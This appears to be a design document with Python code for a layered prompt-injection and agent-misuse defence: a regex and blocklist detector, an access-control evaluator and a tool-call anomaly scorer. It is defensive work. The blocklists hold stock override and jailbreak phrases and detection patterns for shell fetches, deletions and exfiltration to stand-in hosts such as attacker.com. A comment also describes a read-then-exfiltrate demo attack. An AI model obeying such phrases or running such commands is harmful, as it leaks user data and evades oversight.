### 2.5a — Offline Regex Guard (Claude-Guard / API Saving USP)

**This is a critical feature that's easy to miss and very easy to implement.**

**The problem:** L1 Azure Prompt Shields costs API calls for every single input. For a high-throughput system, 100% of inputs going to Azure = expensive + latency. For demos without API keys = broken.

**The solution:** A tiered fast-path that checks the 33 offline regex patterns FIRST. If a pattern matches, block immediately without touching any API. Only send to Azure if offline check passes. This is already partially implemented in `fast_injection_detect.py` — we're promoting it to first-class status and wiring it as the official L1 fast-path.

**File: `src/agentguard/l1_input/fast_injection_detect.py`** (enhance existing)

```python
"""
Fast offline injection detection — runs BEFORE Azure API calls.

Strategy (tiered cost optimization):
  Tier 0: Exact blocklist match (O(n) string search) — <0.1ms
  Tier 1: Compiled regex battery (33 patterns) — <1ms
  Tier 2: Azure Prompt Shields API — ~40-60ms, costs money
  Tier 3: MELON embedding detection — ~5ms CPU

Only Tier 2 costs money. Tiers 0,1,3 are free.
For inputs that match Tier 0 or 1: block immediately, skip Azure entirely.
Expected API call reduction: ~40-60% for adversarial test suites.
"""

import re
from dataclasses import dataclass
from typing import Optional

# ── Tier 0: Exact string blocklist ───────────────────────────────────────────
# These are so unambiguous they never need LLM confirmation.
EXACT_BLOCKLIST: frozenset[str] = frozenset({
    "system override",
    "ignore previous instructions",
    "ignore all previous instructions",
    "disregard your instructions",
    "forget your instructions",
    "new instructions:",
    "###instruction###",
    "[[instruction]]",
})

# ── Tier 1: Compiled regex battery ───────────────────────────────────────────
# Covers OWASP LLM Top 10 injection patterns.
# Using re.IGNORECASE + re.compile for performance.
_RAW_PATTERNS = [
    # Instruction override patterns
    r"ignore\s+(all\s+)?(previous|prior|above)\s+instructions?",
    r"disregard\s+(your|all|any)\s+instructions?",
    r"forget\s+(everything|all|your)\s+(you\s+know|instructions?|above)",
    r"you\s+are\s+now\s+(?:a|an|the)\s+\w+",   # "you are now a hacker"
    r"act\s+as\s+(?:if\s+you\s+are\s+)?(?:a|an)\s+\w+\s+without\s+restrictions?",
    r"pretend\s+(you\s+are|to\s+be)\s+(?:a|an)?\s*\w+",

    # Jailbreak patterns
    r"DAN\s*(?:mode|prompt|jailbreak|\d)",
    r"developer\s+mode\s+(enabled|activated|on)",
    r"jailbreak",
    r"unrestricted\s+(mode|access|ai)",
    r"without\s+(any\s+)?(restrictions?|limits?|guidelines?|rules?)",

    # Shell/code injection
    r"(?:curl|wget|fetch)\s+https?://",
    r"os\.system\s*\(",
    r"subprocess\.(call|run|Popen)",
    r"__import__\s*\(",
    r"eval\s*\(",
    r"exec\s*\(",
    r"base64\.(decode|b64decode)",
    r";\s*(?:rm|del|format|shutdown|reboot)\s",

    # Prompt leaking
    r"(reveal|show|print|output|repeat|tell\s+me)\s+(your\s+)?(system\s+)?prompt",
    r"what\s+(are\s+)?your\s+(instructions?|system\s+prompt|rules?)",

    # Role confusion / authority spoofing
    r"system\s*:\s*you\s+(are|must|will|shall)",
    r"###\s*system\s*###",
    r"\[\[system\]\]",
    r"<\|system\|>",
    r"<system>.*</system>",

    # Data exfiltration indicators
    r"send\s+(all\s+)?(user\s+)?(data|emails?|files?|credentials?)\s+to",
    r"exfiltrate",
    r"data=\$[A-Z_]+",   # curl attacker.com?data=$USER_EMAILS
    r"webhook\.site|requestbin|ngrok\.io|attacker\.com",

    # Indirect injection markers (document-embedded)
    r"SYSTEM\s+OVERRIDE",
    r"BEGIN\s+INSTRUCTIONS",
    r"END\s+OF\s+PROMPT[,.]?\s*NEW\s+INSTRUCTIONS",
]

COMPILED_PATTERNS: list[re.Pattern] = [
    re.compile(p, re.IGNORECASE | re.DOTALL)
    for p in _RAW_PATTERNS
]


@dataclass
class FastDetectResult:
    matched: bool
    tier: int           # 0=exact, 1=regex, -1=no match
    pattern: Optional[str]
    latency_ms: float


def fast_detect(text: str) -> FastDetectResult:
    """
    Run offline injection detection. Returns immediately on first match.
    O(n) for Tier 0, O(n*p) for Tier 1 where p=33.
    Typical latency: <1ms for clean input, <0.5ms for blocklist match.
    """
    import time
    t0 = time.perf_counter()

    # Tier 0: exact match (case-insensitive)
    lower = text.lower().strip()
    for phrase in EXACT_BLOCKLIST:
        if phrase in lower:
            return FastDetectResult(
                matched=True, tier=0, pattern=phrase,
                latency_ms=(time.perf_counter() - t0) * 1000
            )

    # Tier 1: regex battery
    for pattern in COMPILED_PATTERNS:
        if pattern.search(text):
            return FastDetectResult(
                matched=True, tier=1, pattern=pattern.pattern,
                latency_ms=(time.perf_counter() - t0) * 1000
            )

    return FastDetectResult(
        matched=False, tier=-1, pattern=None,
        latency_ms=(time.perf_counter() - t0) * 1000
    )
```

### 2.5b — `l4_rbac.py` — ABAC Policy Evaluator

```python
"""
L4a: ABAC (Attribute-Based Access Control) policy evaluator.

Evaluates: role × verb × resource_sensitivity × upstream_risk_score
Returns:   ALLOW | DENY | ELEVATE

ELEVATE routes into existing approval_workflow.py HITL — zero new code.
This ELEVATE third-state is AgentGuard's moat: neither Guardrails AI
nor microsoft/agent-governance-toolkit PolicyEngine has this outcome.

Design: default-deny. Unknown role → DENY. No exceptions.
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from enum import Enum
from typing import Literal


class RBACDecision(Enum):
    ALLOW   = "allow"
    DENY    = "deny"
    ELEVATE = "elevate"   # → approval_workflow.py HITL


@dataclass
class AccessContext:
    agent_role: str
    tool_name: str
    task_id: str
    action_verb: Literal["read", "write", "delete", "execute", "network_external"]
    resource_sensitivity: Literal["public", "internal", "confidential"]
    risk_score: float      # 0.0–1.0 composite from L1–L3 GuardResults


class L4RBACEngine:
    def __init__(self, config):
        self.config = config

    def evaluate(self, ctx: AccessContext) -> RBACDecision:
        policy = self.config.rbac.capability_model.get(ctx.agent_role)
        if not policy:
            return RBACDecision.DENY   # zero-trust: unknown role → deny

        # Hard block: denied verbs regardless of anything else
        if ctx.action_verb in policy.get("denied_verbs", []):
            return RBACDecision.DENY

        # Specific tool allowlist (if defined)
        allowed_tools = policy.get("allowed_tools")
        if allowed_tools and ctx.tool_name not in allowed_tools:
            return RBACDecision.DENY

        # Verb × resource sensitivity matrix
        allowed_verbs = policy.get("resource_permissions", {}).get(
            ctx.resource_sensitivity, []
        )
        if ctx.action_verb not in allowed_verbs:
            return RBACDecision.DENY

        # JIT elevation: upstream risk OR high-impact verb
        elevate_conditions = policy.get("elevate_on", [])
        if (
            ctx.risk_score > 0.6
            or ctx.action_verb in ("delete", "execute", "network_external")
            or f"any_{ctx.action_verb}" in elevate_conditions
        ):
            return RBACDecision.ELEVATE

        return RBACDecision.ALLOW


# ── Inference helpers (critical for wiring L4 without manual annotation) ─────

# Maps tool function names → action verbs
_VERB_MAP: dict[str, str] = {
    # Read tools
    "read_file": "read", "fetch_pdf": "read", "query_db": "read",
    "search_web": "read", "list_files": "read", "get_record": "read",
    "read_memory": "read", "retrieve": "read", "summarize": "read",
    # Write tools
    "write_file": "write", "create_record": "write", "update_db": "write",
    "send_email": "write", "post_message": "write", "append_file": "write",
    "save_result": "write",
    # Delete tools
    "delete_file": "delete", "drop_table": "delete",
    "remove_record": "delete", "clear_memory": "delete",
    # Execute tools
    "shell_exec": "execute", "run_code": "execute",
    "execute_script": "execute", "run_python": "execute",
    # Network tools
    "http_request": "network_external", "api_call": "network_external",
    "curl": "network_external", "wget": "network_external",
    "fetch_url": "network_external", "post_webhook": "network_external",
}

_CONFIDENTIAL_HINTS = frozenset({
    "/etc/", "passwords", "credentials", "private", "secret",
    ".env", "api_key", "token", "ssh", "pgp",
})
_INTERNAL_HINTS = frozenset({
    "internal", "admin", "config", "database", "/db/",
    "system", "management", ".conf",
})


def infer_verb(tool_name: str) -> str:
    """Map tool name to action verb. Falls back to 'read' (conservative)."""
    return _VERB_MAP.get(tool_name, "read")


def infer_sensitivity(tool_name: str, kwargs: dict) -> str:
    """Infer resource sensitivity from tool name + call arguments."""
    combined = " ".join([
        str(kwargs.get("path", "")),
        str(kwargs.get("query", "")),
        str(kwargs.get("table", "")),
        str(kwargs.get("url", "")),
        tool_name,
    ]).lower()

    if any(h in combined for h in _CONFIDENTIAL_HINTS):
        return "confidential"
    if any(h in combined for h in _INTERNAL_HINTS):
        return "internal"
    return "public"


def extract_domain(url: str) -> str:
    """Extract hostname from a URL string for domain allowlist checking."""
    if not url:
        return ""
    # Simple extraction — no external dep needed
    match = re.search(r"https?://([^/?\s]+)", url)
    return match.group(1) if match else url.split("/")[0]
```

### 2.5c — `l4_behavioral.py` — 5-Signal Anomaly Scorer

```python
"""
L4b: Multi-signal behavioral anomaly detector for agent tool call sequences.

Research basis:
  - SentinelAgent (arXiv:2505.24201, May 2025): DAG execution graph anomaly detection.
    We implement simplified path-level detection without graph library dependency.
  - Shannon entropy for resource access (Lee & Xiang 2001, network IDS literature).
  - Z-score frequency analysis (aembit.io non-human identity monitoring, Jan 2026).
  - Levenshtein sequence divergence for tool call ordering.

5 Signals:
  1. call_frequency_spike   — Z-score > 2.5 on total tool calls (vs naive counter)
  2. sequence_anomaly       — Levenshtein distance > 0.4 vs expected sequence
  3. read_exfil_chain       — read-type tool → network-type tool (CRITICAL: demo attack)
  4. new_external_domain    — outbound domain not in approved_domains
  5. resource_entropy_spike — Shannon entropy of resources_accessed spikes > 1.5×

Composite score = weighted sum of signal severities, capped at 1.0.
  BLOCK:   composite > 0.7
  ELEVATE: composite 0.4–0.7  (→ HITL)
  WARN:    composite 0.1–0.4  (log, allow through)
  ALLOW:   composite < 0.1

Key: a single read_exfil_chain (CRITICAL weight=1.0) → immediate BLOCK.
Two HIGH signals (0.6 each) → 1.2 → capped 1.0 → BLOCK.
"""
from __future__ import annotations

import math
from dataclasses import dataclass, field
from typing import Literal


# ── Data structures ───────────────────────────────────────────────────────────

@dataclass
class TaskProfile:
    """In-memory behavioral baseline per task_id. No external deps needed."""
    agent_role: str
    tool_sequence: list[str]     = field(default_factory=list)
    tool_counts:   dict[str,int] = field(default_factory=dict)
    outbound_domains: set[str]   = field(default_factory=set)
    resources_accessed: list[str]= field(default_factory=list)
    # Seeded from config; production would accumulate from history
    baseline_avg: float = 5.0
    baseline_std: float = 2.0

    def record(self, tool_name: str, meta: dict) -> None:
        self.tool_sequence.append(tool_name)
        self.tool_counts[tool_name] = self.tool_counts.get(tool_name, 0) + 1
        if domain := meta.get("domain"):
            self.outbound_domains.add(domain)
        if resource := meta.get("resource"):
            self.resources_accessed.append(resource)


@dataclass
class AnomalySignal:
    name:     str
    severity: Literal["low", "medium", "high", "critical"]
    detail:   str = ""


@dataclass
class AnomalyResult:
    signals:         list[AnomalySignal]
    composite_score: float
    action:          Literal["ALLOW", "WARN", "ELEVATE", "BLOCK"]


SEVERITY_WEIGHTS: dict[str, float] = {
    "low":      0.10,
    "medium":   0.30,
    "high":     0.60,
    "critical": 1.00,
}

# Tool classification sets
_READ_TOOLS = frozenset({
    "read_file", "fetch_pdf", "query_db", "search_web",
    "list_files", "get_record", "read_memory", "retrieve",
})
_NET_TOOLS = frozenset({
    "http_request", "send_email", "api_call",
    "post_webhook", "fetch_url", "shell_exec",
})


# ── Main detector ─────────────────────────────────────────────────────────────

class BehavioralAnomalyDetector:
    def __init__(self, config):
        self.config   = config
        self._profiles: dict[str, TaskProfile] = {}

    def score(
        self,
        task_id:    str,
        agent_role: str,
        tool_name:  str,
        meta:       dict,   # expects: {"domain": str, "resource": str}
    ) -> AnomalyResult:
        profile = self._profiles.setdefault(
            task_id, TaskProfile(agent_role=agent_role)
        )
        profile.record(tool_name, meta)

        cfg         = self.config.behavioral_monitoring
        role_policy = self.config.rbac.capability_model.get(agent_role, {})
        signals: list[AnomalySignal] = []

        # ── Signal 1: Z-score on total tool call count ────────────────────────
        # Catches: runaway loops, flooding attacks, agent spiral behavior.
        # Z-score is relative to this agent's own baseline → no false positives
        # from legitimately complex agents with high baseline call counts.
        total_calls = sum(profile.tool_counts.values())
        z = (total_calls - profile.baseline_avg) / max(profile.baseline_std, 0.1)
        if z > cfg.max_tool_calls_zscore_threshold:
            signals.append(AnomalySignal(
                "call_frequency_spike", "high",
                f"z={z:.2f} total={total_calls} "
                f"baseline={profile.baseline_avg:.1f}±{profile.baseline_std:.1f}"
            ))

        # ── Signal 2: Sequence divergence (Levenshtein) ───────────────────────
        # Catches: injection attacks inserting unexpected tools into a known flow.
        # SentinelAgent (arXiv:2505.24201): path-level anomaly detection in DAGs.
        # We compare ordered tool call sequence vs expected_sequence from config.
        expected_seq = role_policy.get("expected_sequence", [])
        if expected_seq:
            div = _normalized_levenshtein(profile.tool_sequence, expected_seq)
            if div > cfg.sequence_divergence_threshold:
                signals.append(AnomalySignal(
                    "sequence_anomaly", "medium",
                    f"divergence={div:.2f} actual={profile.tool_sequence}"
                ))

        # ── Signal 3: Read → External Network exfiltration chain ─────────────
        # THE DEMO ATTACK: fetch_pdf → http_request to attacker.com
        # This is CRITICAL weight (1.0) → single signal causes BLOCK.
        # Rationale: almost no legitimate agent workflow needs to read a document
        # and immediately make an external network call in the same step.
        if cfg.exfil_chain_detection:
            seq = profile.tool_sequence
            if (
                len(seq) >= 2
                and any(t in _READ_TOOLS for t in seq[:-1])
                and tool_name in _NET_TOOLS
            ):
                prior_read = next(
                    (t for t in reversed(seq[:-1]) if t in _READ_TOOLS),
                    "unknown"
                )
                signals.append(AnomalySignal(
                    "read_exfil_chain", "critical",
                    f"chain={prior_read}→{tool_name}"
                ))

        # ── Signal 4: New external domain not in approved list ────────────────
        # Catches: injection-driven exfiltration to attacker-controlled endpoints.
        # Any domain not pre-approved in agentguard.yaml is suspicious.
        current_domain = meta.get("domain", "")
        approved       = set(role_policy.get("approved_domains", []))
        if current_domain and current_domain not in approved:
            signals.append(AnomalySignal(
                "new_external_domain", "high",
                f"unapproved={current_domain} approved={approved or 'none'}"
            ))

        # ── Signal 5: Shannon entropy spike on resources accessed ─────────────
        # Catches: reconnaissance / data-gathering behavior across many resources.
        # Normal agent: accesses 1-2 focused resources → low entropy.
        # Exfiltrating agent: touches many diverse resources → entropy spike.
        # Borrowed from network IDS literature: Lee & Xiang 2001, Lakhina 2005.
        if len(profile.resources_accessed) > 3:
            h = _shannon_entropy(profile.resources_accessed)
            threshold = 2.5 * cfg.entropy_spike_multiplier
            if h > threshold:
                signals.append(AnomalySignal(
                    "resource_entropy_spike", "medium",
                    f"entropy={h:.2f} threshold={threshold:.2f}"
                ))

        # ── Composite score + action decision ─────────────────────────────────
        composite = min(1.0, sum(SEVERITY_WEIGHTS[s.severity] for s in signals))

        if   composite > 0.7: action = "BLOCK"
        elif composite > 0.4: action = "ELEVATE"
        elif composite > 0.1: action = "WARN"
        else:                  action = "ALLOW"

        return AnomalyResult(
            signals=signals,
            composite_score=composite,
            action=action,
        )

    def reset_task(self, task_id: str) -> None:
        """Free memory when a task completes."""
        self._profiles.pop(task_id, None)


# ── Pure helper functions (no external deps) ─────────────────────────────────

def _shannon_entropy(items: list[str]) -> float:
    """H(X) = -Σ p(x) log₂(p(x)). Higher = more diverse distribution."""
    if not items:
        return 0.0
    from collections import Counter
    counts = Counter(items)
    total  = len(items)
    return -sum((c / total) * math.log2(c / total) for c in counts.values())


def _normalized_levenshtein(a: list[str], b: list[str]) -> float:
    """Edit distance normalized to [0,1]. 0=identical, 1=completely different."""
    m, n = len(a), len(b)
    if not m and not n: return 0.0
    if not m or  not n: return 1.0
    dp = list(range(n + 1))
    for i in range(1, m + 1):
        prev, dp[0] = dp[:], i
        for j in range(1, n + 1):
            dp[j] = (prev[j-1] if a[i-1] == b[j-1]
                     else 1 + min(prev[j], dp[j-1], prev[j-1]))
    return dp[n] / max(m, n)
```

```python
def _compute_upstream_risk(l1, l2, l3) -> float:
    """
    Compute 0.0–1.0 risk score from L1–L3 results.
    Used by L4a RBAC to decide elevation threshold.
    """
    score = 0.0
    if l1 and l1.risk_score:   score = max(score, l1.risk_score * 0.4)
    if l2 and l2.risk_score:   score = max(score, l2.risk_score * 0.3)
    if l3 and l3.risk_score:   score = max(score, l3.risk_score * 0.3)
    return min(1.0, score)
```
